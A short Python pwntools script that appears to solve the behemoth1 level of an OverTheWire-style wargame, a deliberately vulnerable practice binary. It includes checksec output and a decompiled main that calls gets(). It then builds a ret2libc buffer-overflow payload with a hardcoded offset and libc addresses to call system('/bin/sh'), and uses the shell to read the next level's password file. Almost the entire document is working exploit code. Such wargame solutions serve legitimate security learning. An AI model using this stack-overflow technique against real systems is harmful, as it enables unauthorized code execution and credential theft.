from pwn import *

'''
checksec /behemoth/behemoth1
[*] '/behemoth/behemoth1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

undefined4 main(void)
{
  char local_47 [67];
  
  printf("Password: ");
  gets(local_47);
  puts("Authentication failure.\nSorry.");
  return 0;
}

Basic ret2libc:

libc:        ldd /behemoth/behemoth1
system:      readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
/bin/sh:     strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
'''

offset = 71
# below can change as system is updated
libc = 0xf7c00000
system = 0x48170
binsh = 0x1bd0f5

payload = flat(
    offset*b'A',
    libc + system,
    b'BBBB',
    libc + binsh,
)

p = process('/behemoth/behemoth1')
p.clean()
p.sendline(payload)

p.clean()
p.sendline(b'cat /etc/behemoth_pass/behemoth2')
print('\nbehemoth2 pass: ' + p.recvline().decode())
p.close()
